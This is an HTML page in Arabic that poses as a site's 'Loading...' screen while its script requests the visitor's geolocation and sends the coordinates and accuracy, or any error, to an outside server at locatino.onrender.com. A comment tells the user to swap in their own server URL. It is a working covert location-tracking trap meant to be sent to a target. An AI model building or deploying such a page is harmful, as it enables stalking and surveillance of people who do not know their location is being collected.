<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <title>تحميل الموقع</title>
</head>
<body>
    <h2>جاري تحميل الموقع...</h2>

<script>
if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(sendLocation, sendError);
} else {
    console.error("المتصفح لا يدعم تحديد الموقع.");
}

function sendLocation(position) {
    const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy
    };

    fetch("https://locatino.onrender.com", {  // غير هذا إلى رابط سيرفرك
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(text => console.log("Server response:", text))
    .catch(error => console.error("خطأ في إرسال الموقع:", error));
}

function sendError(error) {
    fetch("https://locatino.onrender.com", {  // غير هذا إلى رابط سيرفرك
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({error: error.message})
    })
    .then(response => response.text())
    .then(text => console.log("Server error response:", text))
    .catch(err => console.error("خطأ في إرسال الخطأ:", err));
}
</script>

</body>
</html>
